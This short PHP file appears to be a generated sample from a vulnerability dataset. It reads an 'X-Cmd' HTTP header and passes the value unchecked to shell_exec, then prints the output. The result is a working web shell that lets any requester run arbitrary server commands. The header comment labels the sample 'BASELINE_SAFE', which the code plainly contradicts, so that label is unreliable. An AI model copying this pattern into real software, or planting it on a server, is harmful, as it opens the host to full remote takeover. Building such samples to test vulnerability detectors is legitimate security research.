<?php
/* DATASET_SIGNATURE: BASELINE_SAFE_UNIQUE_V2_FIXED_HDR_META; CE_BUCKET=HEADER; CE_MODE=H_GAH_FOREACH_ISTR; SKELETON=S3; KEY=cmd; SINK=B3; VAR=v0180; HDR_NAME=X-Cmd */
function SINK_B3($command){
    $output=shell_exec($command);
    echo $output;
}
$h = function_exists("getallheaders") ? getallheaders() : [];
$inp = "";
foreach($h as $k=>$v){ if(strcasecmp((string)$k, "X-Cmd")===0){ $inp = (string)$v; break; } }
$inp = (string)$inp; // no value processing
$f = function($x){
    return SINK_B3($x);
};
$out = $f($inp);
echo (string)($out);
?>
